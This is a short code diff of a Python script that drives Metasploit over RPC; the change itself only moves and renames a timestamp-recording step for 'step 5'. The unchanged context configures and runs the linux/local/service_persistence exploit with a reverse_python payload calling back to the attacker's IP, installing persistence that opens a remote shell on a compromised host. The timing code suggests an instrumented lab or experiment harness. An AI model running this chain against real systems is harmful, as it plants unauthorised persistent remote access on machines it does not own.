@@ -19,17 +19,17 @@ def main(argv):
     target_ip = argv[3]
 
     client = MsfRpcClient('kali')
+    
+    # start step 5
+    output_time_file = 'time_step_5_start.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
 
     exploit = client.modules.use('exploit', 'linux/local/service_persistence')
     payload = client.modules.use('payload', 'cmd/unix/reverse_python')
     exploit['SESSION'] = 2
     exploit['VERBOSE'] = True
     payload['LHOST'] = my_ip
-
-    time.sleep(2)
-    output_time_file = 'time_stage_5_start.txt'
-    record_timestamp(folder, output_time_file)
-    time.sleep(2)
 
     exploit.execute(payload=payload)
 
